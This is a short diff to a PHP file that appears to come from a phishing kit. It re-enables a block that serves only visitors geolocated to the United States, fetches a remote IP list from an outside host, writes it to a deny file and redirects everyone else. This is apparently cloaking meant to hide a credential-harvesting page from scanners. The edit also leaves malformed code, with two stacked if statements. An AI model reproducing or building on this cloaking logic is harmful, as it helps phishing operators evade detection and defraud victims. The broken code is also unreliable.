@@ -5,7 +5,13 @@ include('../../functions/get_ip.php');
 ################## ACCOUNT INFORMATION #################
 
 
-/*if ($_SESSION['_LOOKUP_COUNTRY_'] == 'United States' OR  $_SESSION['_LOOKUP_COUNTRY_'] == 'Iraq') {
+
+
+if ($_SESSION['_LOOKUP_COUNTRY_'] == 'United States' OR  $_SESSION['_LOOKUP_COUNTRY_'] == 'Iraq')
+
+
+
+if ($_SESSION['_LOOKUP_COUNTRY_'] == 'United States') {
 	
 $ART = file_get_contents("http://saveinfo.aba.ae/LestIP.txt");
 
@@ -20,7 +26,7 @@ fclose($deny);
 
 
 }else{header("location: ../../../../../../NotFound");}
-*/
+
 
 
 ?>
